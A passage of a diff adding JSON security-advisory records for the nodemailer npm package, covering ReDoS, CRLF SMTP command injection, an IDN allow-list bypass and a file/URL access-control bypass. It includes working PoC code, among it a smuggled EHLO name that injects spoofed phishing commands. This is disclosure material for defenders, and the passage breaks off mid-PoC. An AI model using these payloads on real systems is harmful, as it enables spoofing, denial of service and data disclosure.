+          "CWE-703"
+        ],
+        "severity": "HIGH",
+        "github_reviewed": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-14874"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/6218b8df"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/security/cve/CVE-2025-14874"
+        },
+        {
+          "type": "WEB",
+          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2418133"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodemailer/nodemailer"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "3.0.0"
+                },
+                {
+                  "fixed": "7.0.11"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 7.0.10",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-rcmh-qjqh-p98v/GHSA-rcmh-qjqh-p98v.json"
+          }
+        },
+        {
+          "package": {
+            "name": "org.webjars.npm:nodemailer",
+            "ecosystem": "Maven",
+            "purl": "pkg:maven/org.webjars.npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "ECOSYSTEM",
+              "events": [
+                {
+                  "introduced": "3.0.0"
+                },
+                {
+                  "last_affected": "6.10.1"
+                }
+              ]
+            }
+          ],
+          "versions": [
+            "4.6.5",
+            "6.10.1",
+            "6.3.1"
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-rcmh-qjqh-p98v/GHSA-rcmh-qjqh-p98v.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-v53p-9fqp-m79j",
+      "summary": "Nodemailer: Quadratic backtracking in the addressparser free-text fallback allows remote denial of service",
+      "details": "### Summary\n\nWhen `addressparser` finds no address by its strict reading, it falls back to pulling one out of the free text with `/\\s*\\b[^@\\s]+@[^\\s]+\\b\\s*/`. That pattern backtracks quadratically: `[^@\\s]+` is retried from every offset and rescans the run to the next `@` each time. A single header value holding a long whitespace-free run with no usable `@` blocks the Node.js event loop for tens of seconds.\n\nIt is cheaper to exploit than GHSA-prgh-xp8r-p3m5: 273KB is enough for ~43s, where the comment-joined shape needed ~1.5MB for ~10s.\n\n### Details\n\nThe fallback in `src/addressparser/index.ts` ran the pattern as a search. `[^@\\s]+` crosses neither whitespace nor `@`, so from each start offset it scans forward to the next `@` or to the end of the run and then fails, and the engine simply advances one character and repeats. Three shapes make every offset fail:\n\n- the run holds no `@` at all\n- the only `@` has nothing after it\n- the only `@` has nothing before it\n\nA fourth reaches it with a valid address present but placed past a long run, so the long run is walked before the match is found.\n\n### PoC\n\n```js\nconst addressparser = require('nodemailer/lib/addressparser');\nconst s = Date.now();\naddressparser(' >' + '>[x][x]'.repeat(40000)); // 273KB\nconsole.log(Date.now() - s, 'ms'); // ~43000 ms, blocking\n```\n\nMeasured on 10.0.5:\n\n| Value | Parse time |\n| --- | --- |\n| `'[x]'.repeat(40000)` (117KB) | 9.0 s |\n| `'[x]'.repeat(40000) + '@'` (117KB) | 8.9 s |\n| `'@' + '[x]'.repeat(40000)` (117KB) | 8.8 s |\n| `' >' + '>[x][x]'.repeat(40000)` (273KB) | 42.9 s |\n\n### Impact\n\nAlgorithmic-complexity denial of service. Node is single threaded, so the block stalls the whole process. Reachable without authentication anywhere inbound header values are handed to this parser, mailparser being the notable case, and reachable from application input wherever a user-supplied string is used as a message address, since `mime-node` parses `to`, `from` and `cc` when composing.\n\n### Patch\n\nThe search is replaced by a single linear pass that finds the one offset the pattern can match at, which is then applied there with a sticky regex. Match results are unchanged, verified against the previous implementation over 3.4 million random strings comparing both the match offset and the matched text, plus 800k full-parse comparisons.\n\nFound while validating the report in GHSA-prgh-xp8r-p3m5, not reported externally.",
+      "aliases": [
+        "CVE-2026-100700"
+      ],
+      "modified": "2026-09-30T00:00:03.838265495Z",
+      "published": "2026-09-29T23:43:36Z",
+      "database_specific": {
+        "github_reviewed_at": "2026-09-29T23:43:36Z",
+        "nvd_published_at": null,
+        "cwe_ids": [
+          "CWE-1333",
+          "CWE-407"
+        ],
+        "severity": "HIGH",
+        "github_reviewed": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-v53p-9fqp-m79j"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/437d7fc47403df176bc39271641541b7a9bce102"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodemailer/nodemailer"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/releases/tag/v10.0.6"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "10.0.6"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 10.0.5",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-v53p-9fqp-m79j/GHSA-v53p-9fqp-m79j.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-vvjj-xcjg-gr5g",
+      "summary": "Nodemailer Vulnerable to SMTP Command Injection via CRLF in Transport name Option (EHLO/HELO) ",
+      "details": "### Summary\n\nNodemailer versions up to and including 8.0.4 are vulnerable to SMTP command injection via CRLF sequences in the transport `name` configuration option. The `name` value is used directly in the EHLO/HELO SMTP command without any sanitization for carriage return and line feed characters (`\\r\\n`). An attacker who can influence this option can inject arbitrary SMTP commands, enabling unauthorized email sending, email spoofing, and phishing attacks.\n\n### Details\n\nThe vulnerability exists in `lib/smtp-connection/index.js`. When establishing an SMTP connection, the `name` option is concatenated directly into the EHLO command:\n\n```javascript\n// lib/smtp-connection/index.js, line 71\nthis.name = this.options.name || this._getHostname();\n\n// line 1336\nthis._sendCommand('EHLO ' + this.name);\n```\n\nThe `_sendCommand` method writes the string directly to the socket followed by `\\r\\n` (line 1082):\n\n```javascript\nthis._socket.write(Buffer.from(str + '\\r\\n', 'utf-8'));\n```\n\nIf the `name` option contains `\\r\\n` sequences, each injected line is interpreted by the SMTP server as a separate command. Unlike the `envelope.from` and `envelope.to` fields which are validated for `\\r\\n` (line 1107-1119), and unlike `envelope.size` which was recently fixed (GHSA-c7w3-x93f-qmm8) by casting to a number, the `name` parameter receives no CRLF sanitization whatsoever.\n\nThis is distinct from the previously reported GHSA-c7w3-x93f-qmm8 (envelope.size injection) as it affects a different parameter (`name` vs `size`), uses a different injection point (EHLO command vs MAIL FROM command), and occurs at connection initialization rather than during message sending.\n\nThe `name` option is also used in HELO (line 1384) and LHLO (line 1333) commands with the same lack of sanitization.\n\n### PoC\n\n```javascript\nconst nodemailer = require('nodemailer');\nconst net = require('net');\n\n// Simple SMTP server to observe injected commands\nconst server = net.createServer(socket => {\n    socket.write('220 test ESMTP\\r\\n');\n    socket.on('data', data => {\n        const lines = data.toString().split('\\r\\n').filter(l => l);\n        lines.forEach(line => {\n            console.log('SMTP CMD:', line);\n            if (line.startsWith('EHLO') || line.startsWith('HELO'))\n                socket.write('250 OK\\r\\n');\n            else if (line.startsWith('MAIL FROM'))\n                socket.write('250 OK\\r\\n');\n            else if (line.startsWith('RCPT TO'))\n                socket.write('250 OK\\r\\n');\n            else if (line === 'DATA')\n                socket.write('354 Go\\r\\n');\n            else if (line === '.')\n                socket.write('250 OK\\r\\n');\n            else if (line === 'QUIT')\n                { socket.write('221 Bye\\r\\n'); socket.end(); }\n            else if (line === 'RSET')\n                socket.write('250 OK\\r\\n');\n        });\n    });\n});\n\nserver.listen(0, '127.0.0.1', () => {\n    const port = server.address().port;\n\n    // Inject a complete phishing email via EHLO name\n    const transport = nodemailer.createTransport({\n        host: '127.0.0.1',\n        port: port,\n        secure: false,\n        name: 'legit.host\\r\\nMAIL FROM:<attacker@evil.com>\\r\\n'\n            + 'RCPT TO:<victim@target.com>\\r\\nDATA\\r\\n'\n            + 'From: ceo@company.com\\r\\nTo: victim@target.com\\r\\n'\n            + 'Subject: Urgent\\r\\n\\r\\nPhishing content\\r\\n.\\r\\nRSET'\n    });\n\n    transport.sendMail({\n        from: 'legit@example.com',\n        to: 'legit-recipient@example.com',\n        subject: 'Normal email',\n        text: 'Normal content'\n    }, () => { server.close(); process.exit(0); });\n});\n```\n\nRunning this PoC shows the SMTP server receives the injected MAIL FROM, RCPT TO, DATA, and phishing email content as separate SMTP commands before the legitimate email is sent.\n\n### Impact\n\n**Who is affected:** Applications that allow users or external input to configure the `name` SMTP transport option. This includes:\n- Multi-tenant SaaS platforms with per-tenant SMTP configuration\n- Admin panels where SMTP hostname/name settings are stored in databases\n- Applications loading SMTP config from environment variables or external sources\n\n**What can an attacker do:**\n1. **Send unauthorized emails** to arbitrary recipients by injecting MAIL FROM and RCPT TO commands\n2. **Spoof email senders** by injecting arbitrary From headers in the DATA portion\n3. **Conduct phishing attacks** using the legitimate SMTP server as a relay\n4. **Bypass application-level controls** on email recipients, since the injected commands are processed before the application's intended MAIL FROM/RCPT TO\n5. **Perform SMTP reconnaissance** by injecting commands like VRFY or EXPN\n\nThe injection occurs at the EHLO stage (before authentication in most SMTP flows), making it particularly dangerous as the injected commands may be processed with the server's trust context.\n\n**Recommended fix:** Sanitize the `name` option by stripping or rejecting CRLF sequences, similar to how `envelope.from` and `envelope.to` are already validated on lines 1107-1119 of `lib/smtp-connection/index.js`. For example:\n\n```javascript\nthis.name = (this.options.name || this._getHostname()).replace(/[\\r\\n]/g, '');\n```",
+      "aliases": [
+        "CVE-2026-82853"
+      ],
+      "modified": "2026-09-10T03:51:03.476709040Z",
+      "published": "2026-04-08T15:05:20Z",
+      "database_specific": {
+        "nvd_published_at": null,
+        "cwe_ids": [
+          "CWE-93"
+        ],
+        "severity": "MODERATE",
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-04-08T15:05:20Z"
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-vvjj-xcjg-gr5g"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/0a43876801a420ca528f492eaa01bfc421cc306e"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodemailer/nodemailer"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/releases/tag/v8.0.5"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "8.0.5"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.0.4",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-vvjj-xcjg-gr5g/GHSA-vvjj-xcjg-gr5g.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:N"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-wmmp-3585-3rmp",
+      "summary": "Nodemailer: IDN/Punycode domain allow-list bypass leads to email delivery to an attacker-controlled domain",
+      "details": "### Summary\n\nNodemailer resolves an international (IDN / non-ASCII) recipient **domain** to a different Punycode `xn--` label than every UTS\u201146\u2011conformant parser (web browsers, the WHATWG URL Standard, Node's `url.domainToASCII`, Python's `idna`). Its address normalizer (`_normalizeAddress` in `lib/mime-node/index.js`) uses the bundled **raw RFC\u20113492 Punycode codec with no UTS\u201146 mapping/normalization**, so a domain that a standards\u2011compliant validator maps to a trusted domain is delivered by Nodemailer to a **different, attacker\u2011registrable domain**.\n\nAn application that applies a domain allow\u2011list / same\u2011domain check to a recipient using a normal IDN\u2011aware parser (or that shows the normalized recipient to a user for confirmation) and then relies on Nodemailer to deliver to that domain can be induced to send email to an **unintended external domain**. This is the same weakness class as CVE\u20112025\u201113033 (Interpretation Conflict, CWE\u2011436) but reached through IDN/Punycode rather than quoted local\u2011parts, and it is not addressed by the 7.0.7 fix.\n\nBecause the mismatch can be triggered with an **invisible** character (U+00AD SOFT HYPHEN) that UTS\u201146 folds away to the *exact* trusted domain string, no visible look\u2011alike/homograph is required.\n\n### Details\n\n`lib/mime-node/index.js` \u2192 `_normalizeAddress(address)` (around lines 1307\u20131346) splits the address at the last `@` and normalizes the domain like this:\n\n```js\n// lib/mime-node/index.js\ntry {\n    if (/[\\x80-\uffff]/.test(user)) {\n        encodedDomain = punycode.toUnicode(domain.toLowerCase());   // line ~1338\n    } else {\n        encodedDomain = punycode.toASCII(domain.toLowerCase());     // line ~1340\n    }\n} catch (_err) {\n    // keep domain as supplied\n}\nreturn `${this._normalizeLocalPart(user)}@${encodedDomain}`;         // line ~1346\n```\n\n`punycode` here is the project\u2019s bundled codec (`lib/punycode/`), which is a **pure RFC 3492 (Punycode) implementation**. The only normalization applied to the domain is `.toLowerCase()`. It performs **none of the UTS\u201146 \u201cIDNA2008 + compatibility processing\u201d steps** that browsers and DNS\u2011facing resolvers apply before Punycode encoding, specifically:\n\n* removing **Ignored** code points such as `U+00AD` SOFT HYPHEN,\n* **Mapping** full\u2011width / compatibility characters to their canonical ASCII forms,\n* Unicode **NFC** normalization,\n* validity checks.\n\nAs a result, for any domain containing a UTS\u201146\u2011mapped or \u2011ignored character, Nodemailer\u2019s `punycode.toASCII(...)` produces a **different A\u2011label** than `url.domainToASCII(...)` (Node \u2265 7 / WHATWG), `new URL('http://'+domain)`, browsers, and Python\u2019s `idna` (`uts46=True`). Nodemailer then uses its A\u2011label as:\n\n* the SMTP envelope recipient written to the wire as `RCPT TO:<local@xn--\u2026>` (`getEnvelope()` \u2192 `lib/smtp-connection/index.js` `_setEnvelope`), **and**\n* the address emitted in the `To:` / `From:` headers (`_convertAddresses`).\n\nSo the domain a standards\u2011compliant validator computes and the domain Nodemailer actually delivers to **disagree**, on a syntactically valid, validator\u2011accepted address. Concrete divergences (verified on 9.0.6):\n\n| recipient (raw) | UTS\u201146 parser (`url.domainToASCII`) | Nodemailer delivers to |\n|---|---|---|\n| `victim@compa{U+00AD}ny.com` (invisible soft hyphen) | `company.com` | `xn--company-pka.com` |\n| `victim@\uff43\uff4f\uff4d\uff50\uff41\uff4e\uff59.com` (full\u2011width) | `company.com` | `xn--mi7cd4afch9d.com` |\n| `user@ex\u00e1mple.com` (NFD `a`+U+0301) | `xn--exmple-qta.com` | `xn--example-vge.com` |\n\nThis is the \u201cPunycode / IDN parser discrepancy\u201d technique documented in PortSwigger\u2019s *Splitting the email atom* research (which produced e.g. Joomla CVE\u20112024\u201121725 and fixes in the PHP `idna_convert` library). The fix for CVE\u20112025\u201113033 (nodemailer 7.0.7) hardened the *quoted\u2011local\u2011part* path only; this IDN path is independent and still present in **9.0.6 (latest)** and, given the long\u2011standing use of the bundled RFC\u20113492 codec, earlier releases.\n\n**Suggested remediation:** perform UTS\u201146 processing before/at domain encoding so Nodemailer\u2019s resolution matches browsers, validators, and DNS \u2014 e.g. use the runtime\u2019s `url.domainToASCII()` (available since Node 7) instead of the raw `punycode.toASCII`, and decode with the matching UTS\u201146 `domainToUnicode`. At minimum, reject a domain whose value changes under UTS\u201146 mapping (i.e. `punycode.toASCII(d)` \u2260 `url.domainToASCII(d)`).\n\n### PoC\n\nEnvironment: Node.js \u2265 18, the published `nodemailer@9.0.6`. No special configuration; the discrepancy is in domain normalization itself.\n\n`poc-idn.js`:\n\n```js\n'use strict';\nconst net = require('net');\nconst url = require('url');\nconst nodemailer = require('nodemailer'); // 9.0.6\n\nconst TRUSTED   = 'company.com';                        // the only domain the app will mail\nconst RECIPIENT = 'victim@compa\\u00ADny.com';           // attacker input: invisible U+00AD inside \"company\"\n\n// The app's domain allow-list check, done the standard (UTS-46 / browser / WHATWG) way:\nconst seen = url.domainToASCII(RECIPIENT.split('@').pop());\nconsole.log('validator (url.domainToASCII) sees:', JSON.stringify(seen),\n            seen === TRUSTED ? '=> ALLOWED (equals trusted domain)' : '');\n\n// A tiny SMTP sink that prints the literal RCPT TO Nodemailer transmits:\nconst server = net.createServer(sock => {\n  let buf = ''; sock.write('220 sink\\r\\n');\n  sock.on('data', d => { buf += d; let i;\n    while ((i = buf.indexOf('\\r\\n')) >= 0) { const line = buf.slice(0, i); buf = buf.slice(i + 2);\n      const u = line.toUpperCase();\n      if (u.startsWith('EHLO')) sock.write('250-sink\\r\\n250 8BITMIME\\r\\n');\n      else if (u.startsWith('RCPT')) { console.log('nodemailer transmits             :', line); sock.write('250 ok\\r\\n'); }\n      else if (u.startsWith('DATA')) sock.write('354 go\\r\\n');\n      else if (line === '.') sock.write('250 ok\\r\\n');\n      else if (u.startsWith('QUIT')) { sock.write('221 bye\\r\\n'); sock.end(); }\n      else sock.write('250 ok\\r\\n'); } });\n});\nserver.listen(0, '127.0.0.1', async () => {\n  const t = nodemailer.createTransport({ host: '127.0.0.1', port: server.address().port, secure: false });\n  await t.sendMail({ from: 'app@company.com', to: RECIPIENT, subject: 'reset your password', text: 'secret link' });\n  t.close(); server.close();\n});\n```\n\nRun:\n\n```\nnpm init -y && npm install nodemailer@9.0.6\nnode poc-idn.js\n```\n\nActual output (Nodemailer 9.0.6):\n\n```\nvalidator (url.domainToASCII) sees: \"company.com\" => ALLOWED (equals trusted domain)\nnodemailer transmits             : RCPT TO:<victim@xn--company-pka.com>\n```\n\nThe application\u2019s domain check approves `company.com`, but the message is sent to `xn--company-pka.com` \u2014 a **different domain an attacker can register** \u2014 carrying the `To:` header `<victim@xn--company-pka.com>` as well.\n\nA containerized version that proves the same result against a **real RFC 5321 SMTP server** (`aiosmtpd`) is included alongside this report (`docker compose up --build`, cases `R6`/IDN); the receiving server accepts `RCPT TO:<victim@xn--company-pka.com>` and reports the recipient domain as `xn--company-pka.com`.\n\n### Impact\n\nAny application that uses Nodemailer to send mail to a recipient whose domain is subjected to a security or trust decision made with a *different* (UTS\u201146\u2011conformant) parser, and then trusts Nodemailer to deliver to that domain. This includes:\n  * recipient **allow\u2011list / block\u2011list / \u201csame corporate domain\u201d checks** implemented with `new URL()`, `url.domainToASCII`, a browser\u2011side check, or an IDN library;\n  * flows that **display or log the normalized recipient domain** for human confirmation (the shown `company.com` differs from the delivered `xn--company-pka.com`);\n  * any domain\u2011gated feature (employee\u2011only registration, \u201csend only to our tenant\u201d, notification routing).\n\n## Patched in 9.1.0\n\nDomain encoding now applies UTS-46 ([259c32d](https://github.com/nodemailer/nodemailer/commit/259c32d)), so `victim@compa\u00adny.com` resolves to `company.com`, matching `url.domainToASCII` and browsers.\n\nOne caveat on the suggested remediation, hardened in [b212ac4](https://github.com/nodemailer/nodemailer/commit/b212ac4): `url.domainToASCII` is a WHATWG **host parser**, not a pure UTS-46 mapper. It terminates the host at `/`, `\\\\`, `?` and `#` and percent-decodes. Used unguarded it introduces a worse version of the same weakness, since `user@attacker.example/mail.corp.example` encodes to the deliverable `user@attacker.example` where the bundled Punycode codec left it intact and unroutable. Those characters are now kept away from the mapper.\n\nOn severity, \"attacker-registrable\" is doing significant work in the report: `xn--company-pka.com` decodes to a label containing U+00AD and `xn--mi7cd4afch9d.com` to full-width Latin, neither of which Verisign's IDN tables permit for a .com registration. The misdelivery and the confirmation-UI mismatch stand regardless, which is why this is rated level with the comment issue rather than above it.",
+      "aliases": [
+        "CVE-2026-92598"
+      ],
+      "modified": "2026-09-17T11:56:00.274908066Z",
+      "published": "2026-09-08T21:33:32Z",
+      "database_specific": {
+        "severity": "MODERATE",
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-09-08T21:33:32Z",
+        "nvd_published_at": null,
+        "cwe_ids": [
+          "CWE-20",
+          "CWE-436"
+        ]
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-wmmp-3585-3rmp"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/pull/1848"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/259c32d7d266301e3377a212776c3fff993c0148"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/b212ac4e27bce8182478044fcb8d1642ccdad46e"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodemailer/nodemailer"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/releases/tag/v9.1.0"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "9.1.0"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-wmmp-3585-3rmp/GHSA-wmmp-3585-3rmp.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-wqvq-jvpq-h66f",
+      "summary": "Nodemailer jsonTransport bypasses disableFileAccess and disableUrlAccess during message normalization",
+      "details": "### Summary\n\nNodemailer's `disableFileAccess` and `disableUrlAccess` options are intended to prevent message content and attachments from reading local files or fetching URLs. The normal MIME streaming path enforces those options in `MimeNode._getStream()`. However, `jsonTransport` serializes messages by calling `mail.normalize()`, which resolves `html`, `text`, alternatives, calendar events, and attachments through `shared.resolveContent()` before MIME generation. `shared.resolveContent()` reads local files and fetches HTTP(S) URLs directly, without receiving or checking `disableFileAccess` or `disableUrlAccess`.\n\nAs a result, applications that use `jsonTransport` as a safe serializer or queue payload generator while relying on `disableFileAccess` / `disableUrlAccess` can still be made to read local files into the generated JSON output or make outbound HTTP requests when an attacker controls message content fields such as attachment `path` or `text.href`.\n\nThe same missing-enforcement root cause is also reachable before normal streaming when `attachDataUrls` causes `_convertDataImages()` to call `mail.resolveContent(mail.data, 'html', ...)`; this should be fixed with the same access-control check.\n\n### Details\nSource-to-sink evidence:\n\n- `lib/nodemailer.js:42-45` selects `JSONTransport` when `createTransport({ jsonTransport: true, ... })` is used.\n- `lib/mailer/mail-message.js:34-39` copies transport-level `disableFileAccess` and `disableUrlAccess` options into `mail.data`.\n- `lib/json-transport/index.js:52-76` serializes mail by calling `mail.normalize((err, data) => ...)`.\n- `lib/mailer/mail-message.js:46-135` implements `resolveAll()` and calls `shared.resolveContent(...args, ...)` for `html`, `text`, `watchHtml`, `amp`, `icalEvent`, alternatives, and attachments.\n- `lib/shared/index.js:506-562` implements `resolveContent()`.\n- `lib/shared/index.js:540-541` fetches HTTP(S) content with `nmfetch(content.path || content.href)`.\n- `lib/shared/index.js:549-550` reads local files with `fs.createReadStream(content.path)`.\n- `shared.resolveContent()` does not check `disableFileAccess` or `disableUrlAccess` and does not receive those flags.\n\nControl path showing intended enforcement:\n\n- `lib/mail-composer/index.js:358-359`, `lib/mail-composer/index.js:367-368`, and sibling child-node creation paths pass `disableUrlAccess` and `disableFileAccess` into `MimeNode`.\n- `lib/mime-node/index.js:51-52` stores those flags.\n- `lib/mime-node/index.js:984-995` rejects file paths with `EFILEACCESS` when `disableFileAccess` is set.\n- `lib/mime-node/index.js:998-1009` rejects URLs with `EURLACCESS` when `disableUrlAccess` is set.\n- `test/mail-composer/mail-composer-test.js:1028-1044` includes a normal MIME-streaming test that expects file access to be blocked when `disableFileAccess: true`.\n\nAdditional same-root-cause variant:\n\n- `lib/mailer/index.js:406-434` implements `_convertDataImages()` for `attachDataUrls`.\n- `lib/mailer/index.js:407-410` calls `mail.resolveContent(mail.data, 'html', ...)` when `attachDataUrls` is enabled and `mail.data.html` is present.\n- Because `mail.resolveContent()` delegates to `shared.resolveContent()` at `lib/mailer/mail-message.js:42-44`, an object-form `html: { path: ... }` or `html: { href: ... }` can be resolved before the later MIME streaming enforcement sees the content.\n- This variant requires `attachDataUrls` to be enabled, so the main reportable default/common path is `jsonTransport`; both should be fixed by enforcing access flags inside the pre-resolution helper or passing policy into it.\n\nDefault/common exposure evidence:\n\n- `jsonTransport` is a shipped runtime transport selected by public `createTransport` options.\n- `test/json-transport/json-transport-test.js:9-83` demonstrates that `jsonTransport` intentionally resolves file-backed `html` and attachments into JSON output.\n- `disableFileAccess` and `disableUrlAccess` are documented by code and tests as security controls and are copied from transport options into message data for all transports.\n- The bypass does not require test-only code, external infrastructure, unsupported configuration, or maintainer-only APIs.\n\nFalse-positive screening and negative controls:\n\n- The local PoC used the same `disableFileAccess: true` and `disableUrlAccess: true` transport options for both `jsonTransport` and normal `streamTransport` controls.\n- `jsonTransport` read the temporary local fixture file and embedded the content in JSON despite `disableFileAccess: true`.\n- `streamTransport` with the same attachment and `disableFileAccess: true` rejected with `EFILEACCESS`.\n- `jsonTransport` fetched a local HTTP listener despite `disableUrlAccess: true`.\n- `streamTransport` with the same URL and `disableUrlAccess: true` rejected with `EURLACCESS`.\n- The local URL proof used only `127.0.0.1` and did not contact external infrastructure.\n\nAffected version evidence and uncertainty:\n\n- Confirmed vulnerable: `nodemailer` 8.0.8 at commit `15138a84c543c20aa399218534cdbbfa2ea1ce55`.\n- Git history shows `jsonTransport` has existed since commit `d78b63b` (2017-02-09, \"Added test for json transport\"), and `disableFileAccess` appears in historical setup commit `6218b8d` (2017-01-31), but older versions were not dynamically tested during this audit.\n- Affected range is therefore recorded as unknown beyond the confirmed current version.\n- No patched version was identified in this checkout.\n\nSeverity rationale:\n\n- AV: The vulnerable library path is typically reached through an application-level message submission or rendering/queueing feature.\n- AC: A single message field using `path` or `href` triggers the bypass when `jsonTransport` is used.\n- PR: Conservative assumption that the attacker is a lower-privileged user of an application that accepts partially user-controlled message objects. Some deployments may expose this unauthenticated, but that was not assumed.\n- UI: No user interaction is required after the application accepts the message object.\n- S: The impact remains in the embedding application/library security scope.\n- C: Local file contents can be copied into the generated JSON output when the application later stores, logs, returns, or forwards that JSON.\n- I: The attacker can induce outbound HTTP requests to attacker-chosen or internal URLs from the application host when URL access was intended to be disabled.\n- A: No availability impact was demonstrated; the PoC used bounded local files and a localhost listener only.\n\nFinal self-review:\n\n- Reproduction evidence was generated locally from this checkout using only a temporary file under the OS temp directory and a local `127.0.0.1` HTTP listener.\n- The PoC included positive proof for file read and URL fetch, plus negative controls showing normal `streamTransport` rejects the same inputs with `EFILEACCESS` and `EURLACCESS`.\n- The proof is non-destructive, performs no external network traffic, and deletes its temporary fixture.\n- Reachability, package exposure, policy-enforcement bypass, same-root-cause variant, and false-positive controls were checked as described above.\n- The affected range is not overclaimed; only the current tested version is confirmed vulnerable.\n\n### PoC\n\nFrom a clean checkout of `nodemailer` at commit `15138a84c543c20aa399218534cdbbfa2ea1ce55`, run:\n\n```bash\nnode <<'NODE'\n'use strict';\nconst fs = require('fs');\nconst os = require('os');\nconst path = require('path');\nconst http = require('http');\nconst nodemailer = require('./');\nconst marker = 'NM_JSON_BYPASS_' + Date.now();\nconst fixture = path.join(os.tmpdir(), 'nodemailer-json-bypass-' + process.pid + '.txt');\nfs.writeFileSync(fixture, marker);\nfunction sendMail(transport, data) {\n  return new Promise((resolve, reject) => transport.sendMail(data, (err, info) => err ? reject(err) : resolve(info)));\n}\n(async () => {\n  const jsonTransport = nodemailer.createTransport({ jsonTransport: true, disableFileAccess: true, disableUrlAccess: true });\n  const jsonInfo = await sendMail(jsonTransport, {\n    from: 'sender@example.test',\n    to: 'recipient@example.test',\n    subject: 'json file bypass',\n    text: 'body',\n    attachments: [{ filename: 'secret.txt', path: fixture }]\n  });\n  const jsonMessage = JSON.parse(jsonInfo.message);\n  const decoded = Buffer.from(jsonMessage.attachments[0].content, 'base64').toString('utf8');\n  console.log('JSON_FILE_BYPASS=' + (decoded === marker));\n  console.log('JSON_FILE_CONTENT=' + decoded);\n\n  const streamTransport = nodemailer.createTransport({ streamTransport: true, buffer: true, disableFileAccess: true });\n  try {\n    await sendMail(streamTransport, {\n      from: 'sender@example.test',\n      to: 'recipient@example.test',\n      subject: 'stream control',\n      text: 'body',\n      attachments: [{ filename: 'secret.txt', path: fixture }]\n    });\n    console.log('STREAM_FILE_CONTROL=NO_ERROR');\n  } catch (err) {\n    